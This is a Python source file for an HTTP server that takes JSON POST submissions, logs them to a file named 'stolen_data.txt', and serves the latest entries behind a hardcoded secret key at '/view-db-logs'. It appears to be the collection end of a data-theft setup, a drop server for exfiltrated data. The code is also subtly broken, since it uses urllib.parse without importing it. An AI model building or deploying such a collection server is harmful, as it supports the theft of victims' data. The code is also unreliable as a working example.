from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import threading
from datetime import datetime

# Server settings
SERVER_IP = "0.0.0.0"
SERVER_PORT = 8080
LOG_FILE = "stolen_data.txt"

# Server loop
def server_loop():
    SECRET_KEY = "5d1d5b2dc4cd1fce61"  # Change this to your secret key

    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            query_params = urllib.parse.parse_qs(parsed_path.query)

            if path in ('/', '/index.html'):
                body = b"<html><body><h1>Server is running</h1></body></html>"
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif path == '/health':
                body = b"OK"
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif path == '/view-db-logs':
                provided_key = query_params.get('key', [None])[0]

                if provided_key != SECRET_KEY:
                    body = b"403 Forbidden: Invalid or missing secret key."
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return

                try:
                    with open(LOG_FILE, "r", encoding="utf-8") as log_file:
                        lines = log_file.readlines()

                    recent_lines = lines[-50:]
                    output = "TIMESTAMP | PAYLOAD\n" + "=" * 60 + "\n"
                    if recent_lines:
                        for line in recent_lines:
                            output += line.rstrip("\n") + "\n"
                    else:
                        output += "No log entries found.\n"

                    body = output.encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                except FileNotFoundError:
                    body = b"No log file found."
                    self.send_response(404)
                    self.send_header("Content-type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                except Exception as exc:
                    body = f"Log read error: {exc}".encode("utf-8")
                    self.send_response(500)
                    self.send_header("Content-type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
            else:
                body = b"Not Found"
                self.send_response(404)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        def do_HEAD(self):
            path = self.path.split("?", 1)[0]

            if path in ('/', '/index.html'):
                body = b"<html><body><h1>Server is running</h1></body></html>"
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
            elif path == '/health':
                body = b"OK"
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
            else:
                body = b"Not Found"
                self.send_response(404)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()

        def do_POST(self):
            content_length_header = self.headers.get('Content-Length')
            if content_length_header is None:
                body = b"Missing Content-Length header"
                self.send_response(411)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            try:
                content_length = int(content_length_header)
            except ValueError:
                body = b"Invalid Content-Length header"
                self.send_response(400)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            if content_length <= 0:
                body = b"Empty request body"
                self.send_response(400)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            try:
                post_data = self.rfile.read(content_length)
                data = post_data.decode('utf-8')
                parsed_data = json.loads(data)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}] {parsed_data}\n")

                body = b"Data received!"
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
                body = b"Invalid JSON payload"
                self.send_response(400)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            except Exception:
                body = b"Internal Server Error"
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

    httpd = HTTPServer((SERVER_IP, SERVER_PORT), RequestHandler)
    print(f"Server running on port {SERVER_PORT}...")
    httpd.serve_forever()

# Start the server
if __name__ == "__main__":
    try:
        print("Server started. Ready to receive data.")
        # Run server loop on main thread so the process stays alive
        server_loop()
    except KeyboardInterrupt:
        print("Server stopped by user.")